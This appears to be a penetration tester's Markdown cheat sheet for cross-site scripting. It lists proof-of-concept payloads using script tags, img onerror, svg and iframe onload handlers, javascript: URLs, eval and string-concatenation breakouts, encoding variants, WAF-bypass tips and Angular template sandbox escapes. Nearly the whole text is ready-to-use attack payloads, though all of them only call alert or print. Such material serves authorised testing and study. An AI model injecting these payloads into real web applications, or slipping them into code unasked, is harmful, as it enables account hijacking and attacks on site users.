# XSS
**Useful cheatsheet [here](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)**
**Comprehensive payload list [here](https://github.com/payloadbox/xss-payload-list)**
## POC
- `alert(document.location)`
- `print()`
## Unescaped Tags -> [Script Tags](3.%20Methodology/3.1%20Enumeration/XSS.md#Script%20Tags)
- `<b>STUFF</b>`
- `<b>STUFF`
### Encodings
**Worth double encoding**
- `%3cb%3eSTUFF%3c%2fb%3e`
- `&#x3c;b&#x3e;STUFF&#x3c;&#x2f;b&#x3e;`

## Quick Reflected Encoding Check
**Remember to double check in-browser - HTML-Encoding especially looks weird in Burp, but still works in browser**
`</>'"+().\;|& `
**Note: Ocassionally, some parsers normalize to unicode. Character checks can be bypassed via weird inputs (ie: [here](https://github.com/sambrow/ctf-writeups-2021/tree/master/bamboo-fox/ssrfrog))**

# Sinks
## Tag XSS
### Script
- `<script>print()</script>`
- ``<script>alert`1`</script>``
- `<SrCiPt>print()</SCriPT>`
### Img
- `<img src="" onerror="print()" />`
- ``<img src=1 onerror=alert`1`>``
- `<svg onload="alert()" />`
### Iframe
- `<iframe onload="alert()" />`
- `<iframe onreadystatechange="alert()" />`
#### Manipulating Iframe
- `this.contentWindow`

## Eval
- `"-print()"`
- `";print()"`

## Href
- `javascript:alert()`

## String Templates
- `` `${alert()}` ``

# Bypassing WAF
**Brute force allowed tags/attributes**

**Remember attributes may be blocked only on specific tags - Check all combinations**

**Remember to use Iframes where necessary**
## Neat Tricks
- Focus on element with ID (Chrome/IE/Safari) -> `<URL>#<ID>`
- Passing parameters to error functions -> `onerror=alert;throw 1`

# Javascript Concatenation
**Check if `\` is not encoded - Can be used to bypass escaped quotes**
- `'<BLAH>'+alert()+''`
- `'<BLAH>'-alert()-''`
- `'<BLAH>';alert()//`

# Angular XSS
**Identify page runs Angular first. Wappalyzer works well**
**Head of page will point to Angular source**
**Note: Cannot use `window`, `document`, or `__proto__`**
## ng-app
- `{{constructor.constructor('alert()')()}}`
- `{{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}`

